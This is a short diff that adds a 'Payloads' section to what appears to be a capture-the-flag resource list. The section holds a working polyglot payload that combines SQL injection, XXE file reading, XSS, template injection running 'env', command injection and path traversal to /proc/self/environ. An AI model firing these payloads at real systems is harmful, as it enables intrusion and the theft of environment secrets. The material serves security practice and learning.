@@ -91,6 +91,19 @@
 - https://github.com/Learn-by-doing/sql-injection
 - https://www.nzeros.me/2023/08/07/securinetsminictf2k22/
 
+### Payloads 
+
+- https://swisskyrepo.github.io/blog/payload-plz/
+- https://github.com/minimaxir/big-list-of-naughty-strings/
+
+```txt
+<?or 1
+--[.>],[.</script>,$FLAG\"]|*?><!DOCTYPE x[<!ENTITY x SYSTEM "/dev/shm/flag.txt">]><z>&x;</z><svg/onload=alert(flag)>&x;{system("env")}{*{{["env"]|map("system")and lipsum.__globals__.os.environ}}*}<%=`env`%>'
+union select*,2,*from flag;env
+ -o -exec env ;
+/../../../../../../../../../../proc/self/environ
+```
+
 ### Unsecure website in Docker containers
 
 - https://devdocs.io/
